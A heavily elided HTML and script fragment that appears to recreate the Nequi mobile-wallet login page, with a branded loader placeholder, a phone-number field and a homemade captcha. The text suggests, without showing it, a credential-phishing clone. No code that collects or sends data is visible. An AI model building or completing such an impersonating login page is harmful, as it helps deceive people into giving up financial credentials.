...
<body>
        ...
        <div class="splash__container animate-logo">
            <!-- Inserta aquí el SVG completo del loader de Nequi (N, E, Q, U, I) -->
        </div>
        </div>
        <!-- ⬆️ FIN DEL BLOQUE LOADER -->
            ...
            <div class="input-container">
                <div class="input-container__field">
                    <span class="p-float-label">
                        ...
                        />
                        <label for="txtUsuario">Número de celular</label>
                    </span>
                </div>
            </div>
...
<script>
    document.addEventListener('DOMContentLoaded', () => {
        ...
        // Ya declaraste esto más abajo, así que elimínalo del otro bloque
        ...
        // Captcha script incluido aquí para que comparta contexto
        ...
        captchaBox.addEventListener('click', () => {
            if (verified) return;
            captchaBox.classList.add('verifying'); // <- línea nueva
